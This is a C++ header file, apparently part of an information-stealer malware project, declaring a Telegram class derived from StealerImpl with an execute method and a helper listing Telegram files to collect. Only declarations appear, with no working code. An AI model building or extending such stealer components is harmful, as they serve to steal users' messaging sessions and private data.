//
// Created by .1qxz on 07.06.2024.
//

#ifndef STEALER_TELEGRAM_H
#define STEALER_TELEGRAM_H

#include "../../../StealerImpl.h"

class Telegram : public StealerImpl {
public:
    void execute(fs::path &root) override;
private:
    static std::vector<fs::path> telegramFiles();
};


#endif //STEALER_TELEGRAM_H
